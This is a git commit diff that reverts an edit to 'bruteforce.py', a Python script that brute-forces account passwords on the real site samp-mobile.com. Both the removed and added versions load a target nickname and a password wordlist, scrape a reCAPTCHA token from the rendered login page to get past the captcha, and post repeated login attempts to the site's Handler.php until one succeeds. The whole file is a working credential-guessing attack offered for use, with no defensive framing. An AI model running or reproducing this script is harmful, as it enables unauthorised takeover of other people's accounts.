690b8c705cd99416889b3db50f0665d5ca31d985
UHl0aG9uZWVy <ksdgdfjhgaskfgdjsgf@mail.ru>
2020-09-13 00:30:34 +0800

    Revert "Update bruteforce.py"
    This reverts commit 7a5dc4e4bc4b1f02a8c463aa23a6a4519ecbcb72.

--- bruteforce.py
+++ bruteforce.py
@@ -1,37 +1,43 @@
 # -*- coding: utf-8 -*-
-import requests
+import aiohttp
+import asyncio
 import requests_html
 import json
-import time
 
 
-session = requests_html.HTMLSession()
+async def main():
+	session = aiohttp.ClientSession()
+	parser = requests_html.AsyncHTMLSession()
 
-settings = json.loads(open('settings.json').read())
+	settings = open('settings.json')
+	settings = settings.read()
+	settings = json.loads(settings)
 
-userName = settings['nickname']
-base = open(settings['files'][0]['path']).read().split()
+	userName = settings['nickname']
+	base = open(settings['files'][0]['path'])
+	base = base.read()
+	base = base.split()
 
-for userPassword in base:
-	while True:
-		try:
-			response = session.get('https://samp-mobile.com/account/')
-			response.html.render()
-			g_recaptcha_response = response.html.find('input')[2].attrs['value']
-			break
-		except:
-			pass
-	data = {
-		"user_name" : userName,
-		"user_password" : userPassword,
-		"act" : "account_login",
-		"g-recaptcha-response" : g_recaptcha_response
-	}
-	response = requests.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data).json()
-	status = response['status']
-	if status == 'ok':
-		print('Верный пароль: {}'.format(userPassword))
-		input()
-		exit()
-	else:
-		print('Текущий пароль: {}'.format(userPassword))
+	for userPassword in base:
+		response = await parser.get('https://samp-mobile.com/account/')
+		await response.html.arender()
+		g_recaptcha_response = response.html.find('input')
+		g_recaptcha_response = g_recaptcha_response[2]
+		data = {
+			"user_name" : userName,
+			"user_password" : userPassword,
+			"act" : "account_login",
+			"g-recaptcha-response" : g_recaptcha_response
+		}
+		response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
+		response = await response.json()
+		status = response['status']
+		if status == 'ok':
+			print('Верный пароль: {}'.format(userPassword))
+			input()
+			exit()
+		else:
+			print('Текущий пароль: {}'.format(userPassword))
+
+loop = asyncio.get_event_loop()
+loop.run_until_complete(main())
